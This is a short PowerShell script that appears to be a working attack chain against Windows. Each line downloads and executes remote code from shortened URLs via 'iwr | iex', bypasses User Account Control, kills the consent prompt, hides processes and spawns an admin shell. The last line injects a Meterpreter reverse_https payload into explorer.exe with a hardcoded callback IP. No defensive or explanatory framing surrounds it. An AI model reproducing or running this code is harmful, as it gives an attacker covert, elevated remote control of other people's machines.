
workflow Test
{
    Parallel
    {
        iwr https://goo.gl/x6ZcHM | iex; sleep 0.7;  Bypass-UAC -Method UacMethodNetOle32
        iwr https://goo.gl/zggqse | iex; sleep 0.7; kill-window consent #sendKey kill to consent
        iwr https://goo.gl/zggqse | iex; sleep 0.7; hide-process mmc #hide mmc
        iwr https://goo.gl/wxJHHq | iex; sleep 0.7; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id # PROMPT ADMIN CMD AHAHAH :D #-Args "/c powershell -C iwr goo.gl/ | iex"-ProcPID (ps -Name mmc).id
        iwr https://goo.gl/UJL3nD | iex; sleep 0.7; Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443
    }
}

Test
